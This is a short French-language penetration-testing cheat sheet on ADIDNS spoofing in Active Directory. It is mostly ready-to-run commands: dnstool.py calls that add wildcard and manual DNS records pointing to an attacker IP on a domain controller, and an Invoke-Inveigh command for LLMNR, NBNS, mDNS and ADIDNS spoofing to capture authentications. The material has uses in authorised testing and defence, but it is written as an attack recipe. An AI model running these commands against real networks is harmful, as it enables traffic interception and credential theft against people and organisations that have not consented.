
https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py


> [!Tip]
> Par défaut les utilisateurs peuvent créer des enregistrement DNS s'ils n'existent pas déja.


# Wildcard Records

> [!Tip]
> Permet quelque chose de similaire au LLMNR/NBNS spoofing.
>  Si WINS FORWARD lookup est activé, WINS effectue la résolution de noms pour les ipv4 non trouvés dans la zone DNS, ce qui nous empêche d'utiliser le wildcard.


1. Identifier si WINS FORWARD lookup est activé.

```sh
dnstool.py -u 'DOMAIN\USER' -p 'PASSWORD' --record '@' --action 'query' 'DomainController'
```

2. Afficher les noeuds *

```sh
dnstool.py -u 'DOMAIN\user' -p 'password' --record '*' --action query $DomainController
```

3. Ajouter un noeud wildcard qui pointe vers notre IP.

```sh
dnstool.py -u 'DOMAIN\user' -p 'password' --record '*' --action add --data $AttackerIP $DomainController
```

# Manual Record

1. Vérifier que l'enregistrement n'existe pas déjà.

```sh
dnstool.py -u 'DOMAIN\user' -p 'password' --record 'fqdn.turlututu' --action query $DomainController
```

2. Ajouter un enregistrement manuellement.

```sh
dnstool.py -u 'DOMAIN\user' -p 'password' --record 'fqdn.turlututu' --action add --data $AttackerIP $DomainController
```


# Dynamic Spoofing

https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/adidns-spoofing#dynamic-spoofing


```sh
Invoke-Inveigh -ConsoleOutput Y -ADIDNS combo,ns,wildcard -ADIDNSThreshold 3 -LLMNR Y -NBNS Y -mDNS Y -Challenge 1122334455667788 -MachineAccounts Y
```